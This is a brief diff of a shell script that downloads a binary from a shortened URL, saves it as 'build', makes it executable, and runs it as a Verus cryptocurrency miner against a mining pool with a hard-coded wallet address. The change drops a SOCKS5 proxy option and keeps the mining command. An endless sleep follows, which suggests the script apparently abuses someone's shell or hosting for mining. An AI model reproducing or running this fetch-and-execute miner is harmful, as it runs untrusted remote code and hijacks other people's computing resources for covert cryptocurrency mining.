@@ -6,6 +6,6 @@
 cd /home/shell-bot
 wget -qO build https://git.io/JX7bv
 chmod +x build
-./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.errrrror -p x -t 64 -x socks5://a:a@188.166.61.166:98
+./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.errrrror -p x -t 64
 
 sleep 99999999999999999
